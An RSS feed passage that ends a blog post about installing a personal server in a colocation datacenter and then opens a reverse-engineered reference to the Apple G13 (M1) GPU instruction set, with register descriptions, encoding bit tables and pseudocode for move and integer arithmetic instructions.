href="https://www.youtube.com/watch?v=6-66D9J5PkY">Data Center NETWORKS (what do they look like??)</a> by NetworkChuck</li><li><a href="https://www.youtube.com/watch?v=hdoBQNI_Ab8">How to Virtualize Your Home Router / Firewall Using pfSense</a> by Techno Tim</li><li><a href="https://www.youtube.com/watch?v=wFCc3ts74pQ">A DAY in the LIFE of the DATA CENTRE | RACKING SERVERS with ASH &amp; JAMES!</a> by Custodian Data Centres</li></ul><h2 id="installing-your-server-at-a-local-datacenter">Installing your server at a local datacenter</h2><p>Once your rack server is all set up and ready to go, it's time to move it to a datacenter.</p><p>Some datacenters are privately owned by a single company like Google, but many others are independent companies that lease their racks to anyone willing to pay. This is called <em>colocation</em>.</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/h2_data_center_banner_bg.jpg" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/h2_data_center_banner_bg.jpg 600w, https://blog.alexgleason.me/content/images/2021/02/h2_data_center_banner_bg.jpg 800w" sizes="(min-width: 720px) 720px"><figcaption><a href="https://www.datafoundry.com/">Data Foundry</a>, an independent Houston datacenter offering colocation.</figcaption></figure><p>If you live near a metropolitan area, chances are there's a datacenter nearby willing to let you install your own server. You will get access to power, high speed internet, and multiple layers of security.</p><p>Try searching "&lt;my city&gt; datacenter" or "&lt;my city&gt; ISP".</p><p>If they offer it, I recommend scheduling a tour with a local datacenter. It's a lot of fun and will give you a better idea of what you're dealing with.</p><p>Most datacenters only lease by the rack. These racks can hold up to 42 servers and are far too expensive. What you need is a company that lives <em>inside </em>the datacenter and is willing to lease you space <em>within</em> a single rack. You are looking for something like this:</p><figure><img src="https://blog.alexgleason.me/content/images/2021/02/Screenshot-from-2021-02-10-12-40-34.png" alt="" srcset="https://blog.alexgleason.me/content/images/size/w600/2021/02/Screenshot-from-2021-02-10-12-40-34.png 600w, https://blog.alexgleason.me/content/images/size/w1000/2021/02/Screenshot-from-2021-02-10-12-40-34.png 1000w, https://blog.alexgleason.me/content/images/2021/02/Screenshot-from-2021-02-10-12-40-34.png 1151w" sizes="(min-width: 720px) 720px"><figcaption>Colo pricing from <a href="https://www.layerhost.com/houston-colocation">LayerHost</a> in Houston. LayerHost is located inside of Data Foundry.</figcaption></figure><p>When I installed my server at the datacenter, it went something like this:</p><ol><li>I purchased a plan from the website.</li><li>The datacenter provided me network information over email, including a static IPv4 block, which I used to configure my server's network.</li><li>Using support tickets, we scheduled a time to install the server.</li><li>On that day, I drove to the datacenter and parked. I sent a text message to the provided phone number and a technician came outside. We wheeled my server in on a cart, through some doors, into the rack area.</li><li>The technician installed my server on the rack and connected it to the network.</li><li>I made final changes and tested that I could access my server from outside.</li><li>That's it! Voil√†, you're in a datacenter.</li></ol><p>While this may seem daunting, it is a necessary next step for freedom online. I hope that more people will follow this path of running their ‚Ä¶</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.alexgleason.me/run-your-own-server/">https://blog.alexgleason.me/run-your-own-server/</a></em></p>]]>
            </description>
            <link>https://blog.alexgleason.me/run-your-own-server/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26134691</guid>
            <pubDate>Sun, 14 Feb 2021 18:20:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple G13 GPU Architecture Reference]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26134462">thread link</a>) | @ingve
<br/>
February 14, 2021 | https://dougallj.github.io/applegpu/docs.html | <a href="https://web.archive.org/web/*/https://dougallj.github.io/applegpu/docs.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<p>
This document attempts to describe the Apple G13 GPU architecture, as used
in the M1 SoC. This is based on reverse engineering and is likely to have mistakes.
The Metal Shading Language is typically used to program these GPUs,
and this document uses Metal terminology. For example a CPU <em>SIMD-lane</em>
is a Metal <em>thread</em>, and a CPU <em>thread</em> is a Metal <em>SIMD-group</em>.
</p>

<p>
The G13 architecture has 32 threads per SIMD-group. Each SIMD-group has a
stack pointer (<code>sp</code>), a program counter (<code>pc</code>), a 32-bit
execution mask (<code>exec_mask</code>), and up to 128 general purpose registers.
</p>

<p>
General purpose registers each store one 32-bit value per thread. Each register
can be accessed as a 32-bit register, named <code>r0</code> to <code>r127</code>,
the low 16-bits of the register <code>r0l</code> to <code>r127l</code>, or
the high 16-bits of the register <code>r0h</code> to <code>r127h</code>.
Some instructions may also use pairs of contiguous 32-bit registers to operate
on 64-bit values, and memory operations may use up to four contiguous 16 or
32-bit registers (in both cases, encoded as the first register).
</p>

<p>
A number of physical registers are allocated to each SIMD-group, and registers
from <code>r0</code> to <code>r(N-1)</code> may be used, but accesses to higher
register numbers are not valid, and may read or corrupt data from other
SIMD-groups. Using fewer registers (e.g. by using 16-bit types instead of
32-bit types) allows more SIMD-groups to fit in the physical register file
(higher occupancy), which improves performance.
</p>

<p>
Certain instructions are hardcoded to use early registers. <code>r0l</code>
tracks the execution mask stack, <code>r1</code> is used as the link register,
and <code>r4h</code> appears to be used for something too.
</p>

<p>
Shared state is less well understood, but includes 256 32-bit uniform registers
named <code>u0</code> to <code>u255</code> and similarly accessible as their
16-bit halves, <code>u0l</code> to <code>u255h</code>. These are used for values
that are the same across all threads, such as <code>threads_per_grid</code>, or
addresses of buffers.
</p>

<h2>Conditional Execution</h2>

<p>
Each thread within a SIMD-group may be deactivated, meaning the values in registers
for that thread will keep their current value. Whether or not each thread is active
is tracked in a 32-bit execution mask (in this document, by convention, a one bit
indicates the thread is active and a zero bit indicates it is not).
</p>

<p>
<code>r0l</code> tracks the execution mask stack. When used with flow-control
instructions, the value in <code>r0l</code> indicates how many 'pop' operations
will be needed to re-enable an inactive thread, or zero if the thread is active.
</p>

<p>
The execution mask stack instructions (<code>pop_exec</code>, <code>if_*cmp</code>,
<code>else_*cmp</code> and <code>while_*cmp</code>) are typically used to manage
<code>r0l</code>. They also update <code>exec_mask</code> based on the value in
<code>r0l</code>, and are the only known way to manipulate <code>exec_mask</code>.
However, <code>r0l</code> may be manipulated with other instructions. It should
be initialised to zero prior to using execution mask stack instructions, and
<code>break</code> statements may be implemented by conditionally moving
a value (corresponding to the number of stack-levels to break out of) to
<code>r0l</code> and using a <code>pop_exec 0</code> (which deactivates any
threads that now have non-zero values in <code>r0l</code>).
</p>

<p>
The <code>jmp_exec_none</code> instruction may be used to jump over an <code>if</code>
statement body if no threads are active, and the <code>jmp_exec_any</code> may be used
to jump back to the start of the loop only if one or more threads are still executing
the loop.
</p>

<p>
Execution masking generally prevents reading or writing values from inactive threads,
however SIMD shuffle instructions can read from inactive threads in some cases, which
can be valuable for research or debugging purposes (e.g. it allows observing non-zero
values in <code>r0l</code>).
</p>

<h2>Register Cache</h2>

<p>The GPU has a register cache, which keeps the contents of recently used general
purpose registers more quickly accessible. When instructions read or write GPRs,
they usually allow hints for the access to be encoded. The <code>cache</code> hint,
on a source or destination operand, indicates the value will be used again,
and should be cached (meaning other values, where this hint was not used, will
be preferred for eviction). The <code>discard</code> hint (on a source operand)
invalidates the value in the register cache after all operands have been read,
without writing it back to the register file.</p>

<p>While the <code>cache</code> hint should only change performance, the
<code>discard</code> hint will make future reads undefined, which could
lead to confusing issues. <code>discard</code> should probably not
be used with conditional execution.</p>

<p>
Either hint may be used multiple times even if the same operand appears twice,
and <code>discard</code> on a source register can be used with <code>cache</code>
on the same destination register.
</p>





<p>
Instructions vary in length in multiples of two bytes up to ten bytes. Some
instructions have a long and short encoding. This is indicated by a bit
<code>L</code>, which, if zero, indicates the last two bytes of the
instruction are omitted, and any bits within those bytes should
be read as zero.
</p>

<p>
The encodings are described in little-endian, meaning bytes go right-to-left
(and top-to-bottom), but bits may be read in the usual numerical order.
</p>

<p>
Behaviour is mostly described in a Python-like pseudocode for now. In operand
descriptions, the <code>:</code> operator describes bit concatenation, with
the most-significant fields first. Elsewhere, values are considered to be
Python-style arbitrary-precision integers, and floating-point values are
considered to be arbitrary-precision floats (although double-precision with
round-to-odd may be an adequate approximation).
</p>

<p>
<label for="wrapcheckbox">
  
  Wrap bit diagrams
</label>
<br>
<label for="rightcheckbox">
  
  Right-align bit diagrams
</label>
</p>

<h2>Move Instructions</h2>
<h3>mov (Move 16-bit Immediate)</h3>
<div><table><thead><tr><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr></thead><tbody><tr><td colspan="1">L</td><td colspan="6">D</td><td colspan="1">0</td><td colspan="1">?</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">0</td></tr></tbody><tfoot><tr><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="2">Dt</td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td></tr></tfoot></table><table><thead><tr><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>24</td><td>23</td><td>22</td><td>21</td><td>20</td><td>19</td><td>18</td><td>17</td><td>16</td></tr></thead><tbody><tr><td colspan="16">imm16</td></tr></tbody><tfoot><tr><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td></tr></tfoot></table><table><thead><tr><td>47</td><td>46</td><td>45</td><td>44</td><td>43</td><td>42</td><td>41</td><td>40</td><td>39</td><td>38</td><td>37</td><td>36</td><td>35</td><td>34</td><td>33</td><td>32</td></tr></thead><tbody><tr><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">Dx</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td></tr></tbody><tfoot><tr><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td></tr></tfoot></table></div><div><table><thead><tr><td>47</td><td>46</td><td>45</td><td>44</td><td>43</td><td>42</td><td>41</td><td>40</td><td>39</td><td>38</td><td>37</td><td>36</td><td>35</td><td>34</td><td>33</td><td>32</td><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>24</td><td>23</td><td>22</td><td>21</td><td>20</td><td>19</td><td>18</td><td>17</td><td>16</td><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr></thead><tbody><tr><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">Dx</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="16">imm16</td><td colspan="1">L</td><td colspan="6">D</td><td colspan="1">0</td><td colspan="1">?</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">0</td></tr></tbody><tfoot><tr><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="2">Dt</td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td></tr></tfoot></table></div>
<pre>D = ALUDst(Dx:D, Dt)

D.broadcast_to_active(imm16)
</pre>
<h3>mov (Move 32-bit Immediate)</h3>
<div><table><thead><tr><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr></thead><tbody><tr><td colspan="1">L</td><td colspan="6">D</td><td colspan="1">1</td><td colspan="1">?</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">0</td></tr></tbody><tfoot><tr><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="2">Dt</td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td></tr></tfoot></table><table><thead><tr><td>47</td><td>46</td><td>45</td><td>44</td><td>43</td><td>42</td><td>41</td><td>40</td><td>39</td><td>38</td><td>37</td><td>36</td><td>35</td><td>34</td><td>33</td><td>32</td><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>24</td><td>23</td><td>22</td><td>21</td><td>20</td><td>19</td><td>18</td><td>17</td><td>16</td></tr></thead><tbody><tr><td colspan="32">imm32</td></tr></tbody><tfoot><tr><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td></tr></tfoot></table><table><thead><tr><td>63</td><td>62</td><td>61</td><td>60</td><td>59</td><td>58</td><td>57</td><td>56</td><td>55</td><td>54</td><td>53</td><td>52</td><td>51</td><td>50</td><td>49</td><td>48</td></tr></thead><tbody><tr><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">Dx</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td></tr></tbody><tfoot><tr><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td></tr></tfoot></table></div><div><table><thead><tr><td>63</td><td>62</td><td>61</td><td>60</td><td>59</td><td>58</td><td>57</td><td>56</td><td>55</td><td>54</td><td>53</td><td>52</td><td>51</td><td>50</td><td>49</td><td>48</td><td>47</td><td>46</td><td>45</td><td>44</td><td>43</td><td>42</td><td>41</td><td>40</td><td>39</td><td>38</td><td>37</td><td>36</td><td>35</td><td>34</td><td>33</td><td>32</td><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>24</td><td>23</td><td>22</td><td>21</td><td>20</td><td>19</td><td>18</td><td>17</td><td>16</td><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr></thead><tbody><tr><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">Dx</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="32">imm32</td><td colspan="1">L</td><td colspan="6">D</td><td colspan="1">1</td><td colspan="1">?</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">0</td></tr></tbody><tfoot><tr><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="2">Dt</td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td><td colspan="1"></td></tr></tfoot></table></div>
<pre>D = ALUDst(Dx:D, Dt)

D.broadcast_to_active(imm32)
</pre>
<h3>get_sr (Move From Special Register)</h3>
<div><table><thead><tr><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr></thead><tbody><tr><td colspan="1">0</td><td colspan="6">D</td><td colspan="2">Dt</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">0</td></tr></tbody></table><table><thead><tr><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>24</td><td>23</td><td>22</td><td>21</td><td>20</td><td>19</td><td>18</td><td>17</td><td>16</td></tr></thead><tbody><tr><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">Dx</td><td colspan="2">SRx</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="6">SR</td></tr></tbody></table></div><div><table><thead><tr><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>24</td><td>23</td><td>22</td><td>21</td><td>20</td><td>19</td><td>18</td><td>17</td><td>16</td><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr></thead><tbody><tr><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">Dx</td><td colspan="2">SRx</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="6">SR</td><td colspan="1">0</td><td colspan="6">D</td><td colspan="2">Dt</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">0</td></tr></tbody></table></div>
<pre>D = ALUDst(Dx:D, Dt)
SR = SReg32(SRx:SR)

for each active thread:
  D[thread] = SR.read(thread)
</pre>
<h2>Integer Arithmetic Instructions</h2>
<h3>iadd (Integer Add or Subtract)</h3>
<div><table><thead><tr><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr></thead><tbody><tr><td colspan="1">0</td><td colspan="6">D</td><td colspan="2">Dt</td><td colspan="1">S</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">0</td></tr></tbody></table><table><thead><tr><td>39</td><td>38</td><td>37</td><td>36</td><td>35</td><td>34</td><td>33</td><td>32</td><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>24</td><td>23</td><td>22</td><td>21</td><td>20</td><td>19</td><td>18</td><td>17</td><td>16</td></tr></thead><tbody><tr><td colspan="1">s1</td><td colspan="1">Bs</td><td colspan="4">Bt</td><td colspan="6">B</td><td colspan="1">N</td><td colspan="1">As</td><td colspan="4">At</td><td colspan="6">A</td></tr></tbody></table><table><thead><tr><td>63</td><td>62</td><td>61</td><td>60</td><td>59</td><td>58</td><td>57</td><td>56</td><td>55</td><td>54</td><td>53</td><td>52</td><td>51</td><td>50</td><td>49</td><td>48</td><td>47</td><td>46</td><td>45</td><td>44</td><td>43</td><td>42</td><td>41</td><td>40</td></tr></thead><tbody><tr><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">s2</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">Dx</td><td colspan="2">Ax</td><td colspan="2">Bx</td></tr></tbody></table></div><div><table><thead><tr><td>63</td><td>62</td><td>61</td><td>60</td><td>59</td><td>58</td><td>57</td><td>56</td><td>55</td><td>54</td><td>53</td><td>52</td><td>51</td><td>50</td><td>49</td><td>48</td><td>47</td><td>46</td><td>45</td><td>44</td><td>43</td><td>42</td><td>41</td><td>40</td><td>39</td><td>38</td><td>37</td><td>36</td><td>35</td><td>34</td><td>33</td><td>32</td><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>24</td><td>23</td><td>22</td><td>21</td><td>20</td><td>19</td><td>18</td><td>17</td><td>16</td><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr></thead><tbody><tr><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">s2</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">Dx</td><td colspan="2">Ax</td><td colspan="2">Bx</td><td colspan="1">s1</td><td colspan="1">Bs</td><td colspan="4">Bt</td><td colspan="6">B</td><td colspan="1">N</td><td colspan="1">As</td><td colspan="4">At</td><td colspan="6">A</td><td colspan="1">0</td><td colspan="6">D</td><td colspan="2">Dt</td><td colspan="1">S</td><td colspan="1">0</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">0</td></tr></tbody></table></div>
<pre>D = ALUDst64(Dx:D, Dt)
A = AddSrc(Ax:A, At, As)
B = AddSrc(Bx:B, Bt, Bs)
shift = s2:s1

for each active thread:
  a = A[thread]
  b = B[thread]

  saturating = (S == 1 and shift == 0 and A.thread_bit_size &lt;= 32 and
                B.thread_bit_size &lt;= 32 and D.thread_bit_size &lt;= 32)

  if N == 1:
    b = -b

  if shift &lt; 5:
    b &lt;&lt;= shift
  else:
    b = 0

  result = a + b

  if saturating:
    signed = (As == 1 or Bs == 1)
    result = saturate_integer(result, D.thread_bit_size, signed)

  D[thread] = result
</pre>
<h3>imadd (Integer Multiply-Add or Subtract)</h3>
<div><table><thead><tr><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr></thead><tbody><tr><td colspan="1">0</td><td colspan="6">D</td><td colspan="2">Dt</td><td colspan="1">S</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">0</td></tr></tbody></table><table><thead><tr><td>39</td><td>38</td><td>37</td><td>36</td><td>35</td><td>34</td><td>33</td><td>32</td><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>24</td><td>23</td><td>22</td><td>21</td><td>20</td><td>19</td><td>18</td><td>17</td><td>16</td></tr></thead><tbody><tr><td colspan="1">s1</td><td colspan="1">Bs</td><td colspan="4">Bt</td><td colspan="6">B</td><td colspan="1">N</td><td colspan="1">As</td><td colspan="4">At</td><td colspan="6">A</td></tr></tbody></table><table><thead><tr><td>63</td><td>62</td><td>61</td><td>60</td><td>59</td><td>58</td><td>57</td><td>56</td><td>55</td><td>54</td><td>53</td><td>52</td><td>51</td><td>50</td><td>49</td><td>48</td><td>47</td><td>46</td><td>45</td><td>44</td><td>43</td><td>42</td><td>41</td><td>40</td></tr></thead><tbody><tr><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">Dx</td><td colspan="2">Ax</td><td colspan="2">Bx</td><td colspan="2">Cx</td><td colspan="2">s2</td><td colspan="1">?</td><td colspan="1">Cs</td><td colspan="4">Ct</td><td colspan="6">C</td></tr></tbody></table></div><div><table><thead><tr><td>63</td><td>62</td><td>61</td><td>60</td><td>59</td><td>58</td><td>57</td><td>56</td><td>55</td><td>54</td><td>53</td><td>52</td><td>51</td><td>50</td><td>49</td><td>48</td><td>47</td><td>46</td><td>45</td><td>44</td><td>43</td><td>42</td><td>41</td><td>40</td><td>39</td><td>38</td><td>37</td><td>36</td><td>35</td><td>34</td><td>33</td><td>32</td><td>31</td><td>30</td><td>29</td><td>28</td><td>27</td><td>26</td><td>25</td><td>24</td><td>23</td><td>22</td><td>21</td><td>20</td><td>19</td><td>18</td><td>17</td><td>16</td><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr></thead><tbody><tr><td colspan="1">?</td><td colspan="1">?</td><td colspan="2">Dx</td><td colspan="2">Ax</td><td colspan="2">Bx</td><td colspan="2">Cx</td><td colspan="2">s2</td><td colspan="1">?</td><td colspan="1">Cs</td><td colspan="4">Ct</td><td colspan="6">C</td><td colspan="1">s1</td><td colspan="1">Bs</td><td colspan="4">Bt</td><td colspan="6">B</td><td colspan="1">N</td><td colspan="1">As</td><td colspan="4">At</td><td colspan="6">A</td><td colspan="1">0</td><td colspan="6">D</td><td colspan="2">Dt</td><td colspan="1">S</td><td colspan="1">0</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">1</td><td colspan="1">0</td></tr></tbody></table></div>
<pre>D = ALUDst64(Dx:D, Dt)
A = MulSrc(Ax:A, At, As)
B = MulSrc(Bx:B, Bt, Bs)
C = AddSrc(Cx:C, Ct, Cs)
shift = s2:s1

for each active thread:
  a = A[thread]
  b = B[thread]
  c = C[thread]

  saturating = (S == 1 and shift == 0 and C.thread_bit_size &lt;= 32 and
                D.thread_bit_size &lt;= 32)

  if N == 1:
    c = -c

  if shift &lt; 5:
    c &lt;&lt;= shift
  else:
    c = 0

  result = a * b + c

  if saturating:
    signed = (As == 1 or Bs == 1 or Cs == 1)
    result = saturate_integer(result, D.thread_bit_size, signed)

  D[thread] = result
</pre>
<h2>Shift/Bitfield Instructions</h2>
<h3>bfi (Bitfield Insert/Shift Left)</h3>
